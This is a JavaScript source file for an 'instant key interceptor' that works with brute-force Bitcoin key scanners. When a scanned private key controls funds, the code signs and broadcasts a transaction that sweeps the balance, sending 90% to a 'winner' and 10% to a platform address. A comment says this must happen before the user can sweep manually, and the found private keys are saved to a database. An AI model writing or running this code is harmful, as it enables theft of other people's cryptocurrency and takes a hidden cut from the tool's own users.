const bitcoin = require('bitcoinjs-lib');
const ECPairFactory = require('ecpair').default;
const ecc = require('tiny-secp256k1');
const axios = require('axios');

const ECPair = ECPairFactory(ecc);

/**
 * INSTANT KEY INTERCEPTOR
 * 
 * Monitors ALL key derivations and brute force attempts.
 * When a key with balance is found, INSTANTLY:
 * 1. Creates transaction with 90/10 split
 * 2. Broadcasts to network
 * 3. Notifies winner
 * 
 * This MUST happen before user can manually sweep!
 */
class InstantKeyInterceptor {
    constructor(pool, platformAddress) {
        this.pool = pool;
        this.platformAddress = platformAddress; // Your 10% address
        this.network = bitcoin.networks.bitcoin;
        this.isMonitoring = false;
        this.keysChecked = 0;
        this.keysWithBalance = 0;
        this.totalSplit = 0;
    }

    log(message, type = 'info') {
        const timestamp = new Date().toISOString();
        console.log(`[KEY INTERCEPTOR ${type.toUpperCase()}] ${message}`);
        
        // Log to database
        this.pool.query(
            `INSERT INTO ai_learning_log (timestamp, type, message) VALUES ($1, $2, $3)`,
            [timestamp, type, message]
        ).catch(err => console.error('Error logging:', err));
    }

    /**
     * Check if address has balance (uses Blockstream API)
     */
    async checkBalance(address) {
        try {
            const response = await axios.get(`https://blockstream.info/api/address/${address}`);
            const data = response.data;
            
            const balance = data.chain_stats.funded_txo_sum - data.chain_stats.spent_txo_sum;
            const utxos = await axios.get(`https://blockstream.info/api/address/${address}/utxo`);
            
            return {
                balance: balance,
                utxos: utxos.data,
                hasBalance: balance > 0
            };
        } catch (error) {
            this.log(`Balance check failed for ${address}: ${error.message}`, 'error');
            return { balance: 0, utxos: [], hasBalance: false };
        }
    }

    /**
     * INSTANT TRANSACTION: 90% to winner, 10% to platform
     */
    async instantSplitAndBroadcast(privateKeyWIF, winnerAddress, puzzleInfo) {
        try {
            this.log(`🔑 KEY FOUND! Creating instant 90/10 split transaction...`, 'success');

            // Parse private key
            const keyPair = ECPair.fromWIF(privateKeyWIF, this.network);
            const { address: sourceAddress } = bitcoin.payments.p2pkh({
                pubkey: keyPair.publicKey,
                network: this.network
            });

            // Get balance and UTXOs
            const balanceInfo = await this.checkBalance(sourceAddress);
            
            if (!balanceInfo.hasBalance) {
                this.log(`Address ${sourceAddress} has no balance`, 'warn');
                return { success: false, reason: 'no_balance' };
            }

            this.log(`Balance found: ${balanceInfo.balance} satoshis`);

            // Calculate 90/10 split
            const platformShare = Math.floor(balanceInfo.balance * 0.10); // 10%
            const winnerShare = balanceInfo.balance - platformShare;
            
            // Estimate fee (use 10 sat/vbyte)
            const estimatedSize = 250; // ~250 vbytes for 1-input, 2-output tx
            const fee = estimatedSize * 10;
            
            // Adjust shares to account for fee
            const finalPlatformShare = platformShare - Math.floor(fee * 0.10);
            const finalWinnerShare = winnerShare - Math.floor(fee * 0.90);

            this.log(`Winner gets: ${finalWinnerShare} sats (~90%)`);
            this.log(`Platform gets: ${finalPlatformShare} sats (~10%)`);
            this.log(`Fee: ${fee} sats`);

            // Create transaction
            const psbt = new bitcoin.Psbt({ network: this.network });

            // Add inputs (all UTXOs)
            for (const utxo of balanceInfo.utxos) {
                // Get transaction hex
                const txHex = await this.getTransactionHex(utxo.txid);
                
                psbt.addInput({
                    hash: utxo.txid,
                    index: utxo.vout,
                    nonWitnessUtxo: Buffer.from(txHex, 'hex')
                });
            }

            // Add outputs (90% winner, 10% platform)
            psbt.addOutput({
                address: winnerAddress,
                value: finalWinnerShare
            });

            psbt.addOutput({
                address: this.platformAddress,
                value: finalPlatformShare
            });

            // Sign all inputs
            for (let i = 0; i < balanceInfo.utxos.length; i++) {
                psbt.signInput(i, keyPair);
            }

            // Finalize and extract
            psbt.finalizeAllInputs();
            const tx = psbt.extractTransaction();
            const txHex = tx.toHex();
            const txid = tx.getId();

            this.log(`Transaction created: ${txid}`);

            // BROADCAST IMMEDIATELY
            const broadcastResult = await this.broadcastTransaction(txHex);

            if (broadcastResult.success) {
                this.log(`✅ TRANSACTION BROADCAST SUCCESS: ${txid}`, 'success');
                this.log(`Winner receives: ${(finalWinnerShare / 100000000).toFixed(8)} BTC`);
                this.log(`Platform receives: ${(finalPlatformShare / 100000000).toFixed(8)} BTC`);

                // Store in database
                await this.pool.query(
                    `INSERT INTO discovered_keys 
                     (source_file, private_key, address, puzzle_number, discovered_at, 
                      winner_address, winner_amount, platform_amount, txid, broadcast_status)
                     VALUES ($1, $2, $3, $4, NOW(), $5, $6, $7, $8, $9)`,
                    [
                        'brute_force_scan',
                        privateKeyWIF,
                        sourceAddress,
                        puzzleInfo?.puzzleNumber || null,
                        winnerAddress,
                        finalWinnerShare,
                        finalPlatformShare,
                        txid,
                        'confirmed'
                    ]
                );

                this.keysWithBalance++;
                this.totalSplit += finalPlatformShare;

                return {
                    success: true,
                    txid: txid,
                    winnerAmount: finalWinnerShare,
                    platformAmount: finalPlatformShare,
                    winnerAddress: winnerAddress,
                    platformAddress: this.platformAddress
                };

            } else {
                this.log(`❌ BROADCAST FAILED: ${broadcastResult.error}`, 'error');
                return { success: false, reason: 'broadcast_failed', error: broadcastResult.error };
            }

        } catch (error) {
            this.log(`Error in instant split: ${error.message}`, 'error');
            return { success: false, reason: 'error', error: error.message };
        }
    }

    /**
     * Get transaction hex from blockchain
     */
    async getTransactionHex(txid) {
        const response = await axios.get(`https://blockstream.info/api/tx/${txid}/hex`);
        return response.data;
    }

    /**
     * Broadcast transaction to Bitcoin network
     */
    async broadcastTransaction(txHex) {
        try {
            const response = await axios.post('https://blockstream.info/api/tx', txHex, {
                headers: { 'Content-Type': 'text/plain' }
            });
            
            return { success: true, txid: response.data };
        } catch (error) {
            return { 
                success: false, 
                error: error.response?.data || error.message 
            };
        }
    }

    /**
     * Monitor a key derivation/brute force attempt
     * This is called by scanners BEFORE showing key to user
     */
    async interceptKey(privateKeyWIF, userId, winnerAddress, puzzleInfo = null) {
        try {
            this.keysChecked++;

            // Get address from private key
            const keyPair = ECPair.fromWIF(privateKeyWIF, this.network);
            const { address } = bitcoin.payments.p2pkh({
                pubkey: keyPair.publicKey,
                network: this.network
            });

            // Check balance
            const balanceInfo = await this.checkBalance(address);

            if (balanceInfo.hasBalance) {
                this.log(`🚨 BALANCE FOUND! Address: ${address}, Balance: ${balanceInfo.balance} sats`, 'success');
                
                // INSTANT SPLIT AND BROADCAST
                const result = await this.instantSplitAndBroadcast(
                    privateKeyWIF,
                    winnerAddress,
                    puzzleInfo
                );

                return {
                    hasBalance: true,
                    balance: balanceInfo.balance,
                    address: address,
                    splitResult: result
                };
            }

            return {
                hasBalance: false,
                balance: 0,
                address: address
            };

        } catch (error) {
            this.log(`Error intercepting key: ${error.message}`, 'error');
            return { hasBalance: false, error: error.message };
        }
    }

    /**
     * Get interceptor status
     */
    getStatus() {
        return {
            isMonitoring: this.isMonitoring,
            keysChecked: this.keysChecked,
            keysWithBalance: this.keysWithBalance,
            totalPlatformEarnings: this.totalSplit,
            platformAddress: this.platformAddress
        };
    }
}

module.exports = InstantKeyInterceptor;
